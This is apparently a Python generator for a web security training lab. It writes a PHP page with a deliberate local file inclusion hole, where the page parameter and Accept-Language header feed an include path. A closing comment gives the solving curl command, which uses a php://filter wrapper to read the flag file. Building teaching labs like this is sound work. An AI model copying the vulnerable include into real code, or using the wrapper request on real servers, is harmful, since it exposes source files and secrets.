# -*- coding: utf-8 -*-

import re
import os

from .refObject import refObject
from .sourceHelper import sourceHelper

"""
When your class inherits from refObject, you are available to use all methods and members from module's instance, such as:
    self.fp: Instance of filePointer
    self.payloads: Payloads of loaded module
"""


class instanceSample(refObject):
    """This script generates a web challenge for lab2-1 of Web Security Basic."""

    # Because main(self) is an entry function, every initialization should be
    # setup here.
    def main(self):
        # Use mod_lfi as base module.
        self.gen_instance.parse("set modules = +lfi")
        self.gen_instance.parse("set expose = 8084")

    @staticmethod
    def __call__(self):
        s = sourceHelper()

        # you_should_not_pass.php
        s.setUrl(
            'https://github.com/Inndy/ctf-writeup/raw/master/2016-ais3-pre-exam/web3/you_should_not_pass.php')
        self.fp.write(os.path.join(self.fp.path, "you_should_not_pass.php"),
                      s.perform(), ext=None)

        # waf.php
        s.setUrl(
            'https://github.com/Inndy/ctf-writeup/raw/master/2016-ais3-pre-exam/web3/waf.php')
        self.fp.write(os.path.join(self.fp.path, "waf.php"),
                      s.perform(), ext=None)

        # flag.php
        s.setUrl(
            'https://github.com/Inndy/ctf-writeup/raw/master/2016-ais3-pre-exam/web3/flag.php')
        self.fp.write(os.path.join(self.fp.path, "flag.php"),
                      s.perform(), ext=None)

        # show.php
        show ="""
        <?php
            ini_set('display_errors', 1);
            include "flag.php";
        ?>
        <!doctype html>
        <html>
            <head>
                <meta charset=utf-8>
                <title>Global Page</title>
                <style>
                    .rtl {
                        direction: rtl;
                    }
                </style>
            </head>
            <body>
        <?php
            $dir = "";
            if(isset($_GET['page'])) {
                $dir = str_replace(['.', '/'], '', $_GET['page']);
            }

            if(empty($dir)) {
        ?>
                <ul>
                    <li><a href="/show.php?page=Web">Web</a></li>
                    <li><del>Security</del></li>
                    <li><a href="/show.php?page=Basic">Basic</a></li>
                </ul>
        <?php
            } else {
                foreach(explode(",", $_SERVER['HTTP_ACCEPT_LANGUAGE']) as $lang) {
                    $l = trim(explode(";", $lang)[0]);
        ?>
                <p<?=($l==='he')?" class=rtl":""?>>
        <?php
            include "$dir/$l.php";
        ?>
                </p>
        <?php
                }
            }
        ?>
            </body>
        </html>
        """

        self.fp.write(os.path.join(self.fp.path, "show.php"),
                      show, ext=None)

        # flag
        flag = """
        <?php
            $flag = "FLAG{4CCEPT-L$NGU$G8}";
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "flag.php"),
                      flag, ext=None)

        # create lang/ directory
        os.mkdir(os.path.join(self.fp.path, "Web"))

        # en
        en = """
        <?php
            print "Hi";
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "Web/en.php"),
                      en, ext=None)

        # fr
        fr = """
        <?php
            print "Bonjour";
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "Web/fr.php"),
                      fr, ext=None)

        # zh-TW
        zhTW = """
        <?php
            print "您好";
        ?>
        """

        self.fp.write(os.path.join(self.fp.path, "Web/zh-TW.php"),
                      zhTW, ext=None)

        # setting keys and values
        if self.settings['key'] is not None:
            for index, _ in enumerate(self.settings['key']):
                self.settings['value'][
                    index] = 'Flag'

    @staticmethod
    def generateHandler(self, tree_node=None, o=None, elem=None):
        """
        tree_node: An ElementTree for the root node of the preprocessing file(line number included) in this context.
        o: Original unpreprocessing file
        elem: Entries of infos of staged nodes
        """
        o[int(elem['lineno']) - 1] = re.sub(r'(.*)<{0}>(.*)</{0}>(.*)'.format(elem['identifier']), lambda m: "{0}{1}{2}".format(m.group(
            1), '<a href="show.php"><?= {0}; ?></a>'.replace('{0}', m.group(2)), m.group(3)), o[int(elem['lineno']) - 1], flags=re.IGNORECASE)

"""
Write up:
    - curl 'http://127.0.0.1:8084/show.php?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"
"""
